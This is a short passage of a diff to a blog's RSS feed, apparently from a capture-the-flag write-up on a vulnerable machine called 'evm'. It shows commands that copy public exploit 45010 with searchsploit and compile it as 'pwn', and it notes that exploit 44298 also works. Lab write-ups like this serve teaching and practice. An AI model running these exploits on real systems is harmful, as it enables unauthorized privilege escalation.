-gcc 45010.c -o pwn
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>searchsploit -m &lt;span style="color:#ae81ff">45010&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gcc 45010.c -o pwn
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>The second one &lt;code>44298&lt;/code> also works.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item></channel></rss>
